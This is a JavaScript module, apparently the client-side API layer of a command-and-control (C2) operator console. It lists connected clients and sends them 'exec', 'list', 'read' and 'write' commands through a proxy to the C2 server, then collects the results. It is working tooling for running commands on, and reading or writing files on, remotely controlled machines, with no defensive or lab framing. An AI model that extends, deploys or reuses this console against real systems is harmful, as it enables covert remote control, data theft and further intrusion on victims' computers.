// API integration with the C2 server
const api = {
    // Track processed results to avoid duplication
    processedResults: new Set(),
    
    async request(endpoint, method = 'GET', data = null) {
        showLoading();
        try {
            // Increment retry count to avoid infinite loops
            if (state.retryCount >= state.maxRetries) {
                state.retryCount = 0;
                hideLoading();
                throw new Error("Maximum retry attempts reached. Please check your server connection.");
            }
            
            const options = {
                method,
                headers: {
                    'Content-Type': 'application/json',
                    'Accept': 'application/json',
                    'X-C2-Server': state.serverUrl // Pass the C2 server URL to the proxy
                },
                mode: 'cors'
            };

            if (data) {
                options.body = JSON.stringify(data);
            }

            // Use the proxy endpoint instead of direct server communication
            console.log(`Sending request to proxy for: ${endpoint}`);
            const proxyUrl = `/proxy${endpoint}`;
            const response = await fetch(proxyUrl, options);
            
            if (!response.ok) {
                const errorText = await response.text();
                throw new Error(`HTTP error! status: ${response.status}, message: ${errorText}`);
            }
            
            try {
                const result = await response.json();
                hideLoading();
                state.retryCount = 0; // Reset retry count on success
                return result;
            } catch (jsonError) {
                console.error("JSON parsing error:", jsonError);
                hideLoading();
                throw new Error("Failed to parse response from server. The response was not valid JSON.");
            }
        } catch (error) {
            console.error("API Error:", error);
            
            // If the error is related to connection, increment retry count
            if (error.message.includes('Failed to fetch') || 
                error.message.includes('NetworkError') ||
                error.message.includes('Network request failed')) {
                state.retryCount++;
            }
            
            hideLoading();
            showNotification('Error: ' + error.message, 'danger');
            throw error;
        }
    },

    async getClients() {
        try {
            return await this.request('/clients');
        } catch (error) {
            console.error("Failed to get clients:", error);
            return {}; // Return empty object on error to avoid breaking the UI
        }
    },

    async selectClient(clientId) {
        state.currentClient = clientId;
        document.getElementById('current-client').textContent = clientId.substring(0, 10) + '...';
        
        // Reset processed results when switching clients
        this.processedResults.clear();
        
        try {
            return await this.request(`/clients/${clientId}`);
        } catch (error) {
            console.error(`Failed to select client ${clientId}:`, error);
            showNotification(`Error selecting client: ${error.message}`, 'warning');
            return null;
        }
    },

    async sendCommand(clientId, commandType, commandData, commandId = null) {
        console.log(`Sending command: Type=${commandType}, Data=`, commandData, `ID=${commandId}`);
        
        // SIMPLIFIED COMMAND FORMAT - Send exactly what the server expects
        const commandObj = {};
        
        // Set the command type
        commandObj.type = commandType;
        
        // Handle different types of commands
        if (commandType === 'exec') {
            // For exec commands, we need to set the command directly
            commandObj.command = commandData;
        } else if (commandType === 'list') {
            // For list commands, just set the path
            commandObj.path = commandData;
        } else if (commandType === 'read') {
            // For read commands, set the path
            commandObj.path = commandData;
        } else if (commandType === 'write') {
            // For write commands, preserve the passed in object structure
            Object.assign(commandObj, commandData);
        } else {
            // For any other command, preserve the data as passed
            if (typeof commandData === 'object' && commandData !== null) {
                Object.assign(commandObj, commandData);
            } else {
                commandObj.data = commandData;
            }
        }
        
        // Add command ID if provided - FIXED: Use commandId instead of id
        if (commandId) {
            commandObj.commandId = commandId;  // Changed from id to commandId
        }
        
        console.log('Final command object:', commandObj);
        
        try {
            const response = await this.request(`/command/${clientId}`, 'POST', commandObj);
            console.log('Command response:', response);
            return response;
        } catch (error) {
            console.error('Command failed:', error);
            showNotification(`Command failed: ${error.message}`, 'danger');
            throw error;
        }
    },

    async getResults(clientId) {
        try {
            const results = await this.request(`/results/${clientId}`);
            console.log(`Got ${results.length} results for client ${clientId}`);
            return results;
        } catch (error) {
            console.error(`Failed to get results for client ${clientId}:`, error);
            return []; // Return empty array on error to avoid breaking the UI
        }
    },
    
    async markResultProcessed(clientId, resultId) {
        console.log(`Marking result ${resultId} as processed for client ${clientId}`);
        
        try {
            // Store processed result IDs in client-side tracking
            // We're not actually deleting results on the server
            // This is just to prevent duplicate display in the UI
            const key = `${clientId}_${resultId}`;
            
            // Add to our local tracking if not using processedResults set in the object
            if (!this.processedResults) {
                this.processedResults = new Set();
            }
            this.processedResults.add(key);
            
            // Return success
            return { success: true };
        } catch (error) {
            // This is non-critical, so just log the error but don't throw
            console.error('Error marking result as processed:', error);
            return { success: false, error: error.message };
        }
    },
    
    isResultProcessed(resultId) {
        return this.processedResults.has(resultId.toString());
    },
    
    clearProcessedResults() {
        this.processedResults.clear();
    }
};